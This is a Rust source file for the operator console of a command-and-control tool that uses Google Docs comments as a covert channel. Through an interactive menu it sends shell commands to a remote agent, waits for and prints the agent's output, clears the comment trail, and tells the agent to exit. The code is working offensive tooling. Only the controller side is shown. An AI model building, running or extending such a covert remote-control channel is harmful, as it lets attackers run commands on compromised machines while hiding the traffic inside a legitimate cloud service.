use std::time::Duration;

use google_doc2::GoogleDocsC2;
use rand::Rng;

#[async_std::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let spinner = indicatif::ProgressBar::new_spinner();
    spinner.enable_steady_tick(Duration::from_millis(100));
    spinner.set_message("Spawning browser and opening Google Docs...");
    let c2 = GoogleDocsC2::new(env!(
        "DOCS_URL",
        "Must specify a DOCS_URL in the environment variable!"
    ))
    .await?;
    spinner.finish_with_message("Successfully opened Google Docs!");

    loop {
        let choice = dialoguer::Select::new()
            .with_prompt("Choose an action")
            .items(&[
                "Print out all previous commands",
                "Submit a new command",
                "Clear the document",
                "Exit",
            ])
            .interact()?;
        match choice {
            0 => {
                let msgs = google_doc2::shell::read_all_messages(&c2).await?;

                for msg in msgs
                    .iter()
                    .filter(|msg| msg.message_type == google_doc2::shell::MessageType::Command)
                {
                    let output = msgs
                        .iter()
                        .filter(|output_msg| {
                            output_msg.message_id == msg.message_id
                                && output_msg.message_type
                                    == google_doc2::shell::MessageType::Output
                        })
                        .next()
                        .map(|msg| msg.message.to_owned())
                        .unwrap_or("<no output (yet?)>".to_owned());
                    println!("{} -> {}", output, msg.message);
                }
            }
            1 => {
                let command = dialoguer::Input::<String>::new()
                    .with_prompt("Enter a command")
                    .allow_empty(false)
                    .interact()?;

                let spinner = indicatif::ProgressBar::new_spinner();
                spinner.enable_steady_tick(Duration::from_millis(100));
                spinner.set_message("Sending command...");
                let id = rand::thread_rng().gen();
                c2.add_comment(
                    &google_doc2::shell::Message {
                        message_type: google_doc2::shell::MessageType::Command,
                        message_id: id,
                        message: command,
                    }
                    .to_string(),
                )
                .await?;

                // wait for the command to be executed for up to 5 minutes
                spinner.set_message("Waiting for response...");
                'got_response: {
                    for _ in 0..60 {
                        let msgs = google_doc2::shell::read_all_messages(&c2).await?;
                        if let Some(response) = msgs
                            .iter()
                            .filter(|msg| {
                                msg.message_id == id
                                    && msg.message_type == google_doc2::shell::MessageType::Output
                            })
                            .next()
                        {
                            spinner.finish_with_message(format!("-> {}", response.message));
                            break 'got_response;
                        }
                        async_std::task::sleep(std::time::Duration::from_secs(5)).await;
                    }
                    spinner.finish_with_message("Did not receive a response in time! Maybe the command is still running? You can check if the command completed by choosing the first option in the menu.");
                }
            }
            2 => {
                let confirm = dialoguer::Confirm::new()
                    .with_prompt("Are you sure you want to clear the document? This will delete any pending commands and any output from previous commands!")
                    .interact()?;
                if !confirm {
                    continue;
                }
                let spinner = indicatif::ProgressBar::new_spinner();
                spinner.enable_steady_tick(Duration::from_millis(100));
                spinner.set_message("Clearing document...");
                c2.clear_all_comments().await?;
                spinner.finish_with_message("Document cleared!");
            }
            3 => {
                let spinner = indicatif::ProgressBar::new_spinner();
                spinner.enable_steady_tick(Duration::from_millis(100));
                spinner.set_message("Telling agent to exit...");
                c2.add_comment(
                    &google_doc2::shell::Message {
                        message_type: google_doc2::shell::MessageType::Exit,
                        message_id: rand::thread_rng().gen(),
                        message: String::new(),
                    }
                    .to_string(),
                )
                .await?;
                break;
            }
            _ => unreachable!(),
        }
    }

    Ok(())
}
